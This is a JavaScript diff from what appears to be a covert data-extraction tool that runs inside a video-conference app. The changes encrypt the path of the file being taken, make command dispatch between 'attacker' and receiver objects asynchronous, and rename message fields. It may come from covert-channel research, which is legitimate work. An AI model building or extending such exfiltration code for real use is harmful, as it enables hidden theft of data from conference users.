@@ -51,6 +51,10 @@ export class CommunicationHandler {
             console.log('KEYS GENERATED:', this.key, this.iv);
 
             this.configuration.iv = this.iv;
+
+            if (this.configuration.filePath) {
+                this.configuration.filePath = await DataEncoder.encrypt(this.configuration.filePath, this.configuration.key, this.configuration.iv);
+            }
         }
     }
 
@@ -97,9 +101,8 @@ export class CommunicationHandler {
             // Define custom event 'extractionEnded' and trigger it.
 
             if (this.enabledEncryption() && this._fileBuffer.length) {
-                console.log('DECRYPT:', recievedData.payload, this);
-                DataEncoder.decrypt(this.fullData, this.key, this.iv).then(decryptedData => {
-                    APP.conference.DataEncoder = DataEncoder;
+                console.log('DECRYPT:', recievedData.data, this);
+                DataEncoder.decrypt(this.fullData, this.configuration.key, this.configuration.iv).then(decryptedData => {
                     this.dispatchExtractionEvent(decryptedData);
                     this._fileBuffer = []; // empty the file buffer after ending communication.
                     this.communicationEnded = true;
@@ -114,7 +117,7 @@ export class CommunicationHandler {
             }
 
         } else { // 'reply' containg text data
-            this._fileBuffer.push(recievedData.payload);
+            this._fileBuffer.push(recievedData.data);
         }
     }
 }
@@ -151,8 +154,8 @@ export default class ExtractionHandler extends CommunicationHandler {
      *
      * @param {object} initiator
      */
-    executeCommand(initiator) {
-        initiator[initiator.getUsedMethod()]();
+    async executeCommand(initiator) {
+        initiator[await initiator.getUsedMethod()]();
     }
 
     /**
@@ -179,30 +182,41 @@ export default class ExtractionHandler extends CommunicationHandler {
         this.user = attacker;
         this.createExtractionEndedListener();
         if (this.enabledEncryption()) {
-            DataEncoder.encrypt(data, this.configuration.key, this.configuration.iv).then(encryptedData => {
+            DataEncoder.encrypt(data, this.configuration.key, this.configuration.iv).then(async encryptedData => {
                 const initiator = new CovertTransmitter(attacker, this.configuration,
                         this.nameOfCommunication, this.extractionEvent, encryptedData);
 
-                this.executeCommand(initiator);
+                await this.executeCommand(initiator);
             });
         } else {
             const initiator = new CovertTransmitter(attacker, this.configuration,
                     this.nameOfCommunication, this.extractionEvent, data);
 
-            this.executeCommand(initiator);
+            await this.executeCommand(initiator);
+        }
+    }
+
+    /**
+     * Decrypt the filePath message when it is encrypted
+     */
+    async processRequest() {
+        if (this.configuration.encryptionEnabled && this.configuration.filePath) {
+            const { filePath, key, iv } = this.configuration;
+
+            this.configuration.filePath = await DataEncoder.decrypt(filePath, key, iv);
         }
     }
 
     /**
      * Receive data through the specified extraction method.
      */
-    receiveAll(user) {
+    async receiveAll(user) {
         // TODO: add generic code for all types of communication.
         this.user = user;
         const initiator = new CovertReceiver(user, this.configuration,
                 this.nameOfCommunication, this.extractionProcess, this._fileBuffer);
 
-        this.executeCommand(initiator);
+        await this.executeCommand(initiator);
     }
 
     /**
@@ -210,7 +224,7 @@ export default class ExtractionHandler extends CommunicationHandler {
      */
     endCommunication(user) {
         APP.conference.sendEndpointMessage(user.getId(), {
-            extraction: 'reply',
+            type: 'reply',
             isEnd: true
         });
         this.communicationEnded = true;
